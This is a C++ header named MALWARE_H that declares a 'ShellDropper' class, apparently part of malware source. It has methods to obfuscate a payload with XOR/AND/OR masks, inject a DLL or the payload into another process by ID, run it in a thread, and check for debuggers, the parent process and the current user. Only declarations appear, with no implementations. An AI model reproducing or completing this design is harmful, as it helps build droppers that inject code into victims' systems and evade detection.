#ifndef MALWARE_H
#define MALWARE_H

#include <memory> 

class ShellDropper{
    public:
        ShellDropper();
        ShellDropper(const char* payload);
        void xoring(const  char* mask);
        void anding(const char* mask);
        void oring(const char* mask);
        bool run_thread();
        unsigned int get_handler(char* process_name);
        bool inject_process(unsigned int  process_ID,char* dll_path);
        bool run_in_process(unsigned int  process_ID);
        wchar_t* GetParentName();
        bool CheckRunning(wchar_t* process);
        bool isDebuggerPresent();
        wchar_t* CurrentUser();
    private:
        std::unique_ptr<char> payload_data;
        size_t payload_size;
        
        void* new_memory;
};

#endif